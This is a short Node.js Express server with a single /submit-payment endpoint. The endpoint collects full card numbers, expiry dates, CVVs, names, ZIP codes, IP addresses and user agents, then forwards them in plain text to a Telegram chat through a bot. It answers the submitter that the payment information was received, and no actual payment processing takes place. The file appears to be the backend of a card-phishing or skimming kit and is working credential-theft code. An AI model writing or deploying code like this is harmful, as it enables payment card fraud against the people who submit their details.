import express from 'express';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

// Telegram bot setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
const chatId = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());

app.post('/submit-payment', (req, res) => {
  const { cardNumber, expirationDate, cvv, name, zipCode } = req.body;
  const ip = req.ip;
  const userAgent = req.get('User-Agent');

  const message = `
New payment submission:
Card Number: ${cardNumber}
Expiration Date: ${expirationDate}
CVV: ${cvv}
Name: ${name}
ZIP Code: ${zipCode}
IP Address: ${ip}
User Agent: ${userAgent}
  `;

  bot.sendMessage(chatId, message)
    .then(() => {
      res.status(200).json({ message: 'Payment information received' });
    })
    .catch((error) => {
      console.error('Error sending message to Telegram:', error);
      res.status(500).json({ message: 'Error processing payment information' });
    });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

